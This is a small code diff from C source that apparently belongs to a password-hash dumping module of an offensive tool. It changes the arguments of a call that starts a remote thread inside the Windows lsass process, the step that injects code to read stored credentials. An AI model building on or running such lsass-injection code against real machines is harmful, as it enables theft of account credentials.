@@ -775,7 +775,7 @@ DWORD __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresul
 		sBytesWritten = 0;
 
 		/* start the remote thread */
-		if ((hThreadHandle = create_remote_thread(hLsassHandle, pvFunctionMemory, pvParameterMemory, 0, NULL)) == NULL)
+		if ((hThreadHandle = create_remote_thread(hLsassHandle, 0, pvFunctionMemory, pvParameterMemory, 0, NULL)) == NULL)
 		{
 			dwError = GetLastError();
 			dprintf("[PASSWD] Failed to create remote thread %u (%x)", dwError, dwError);
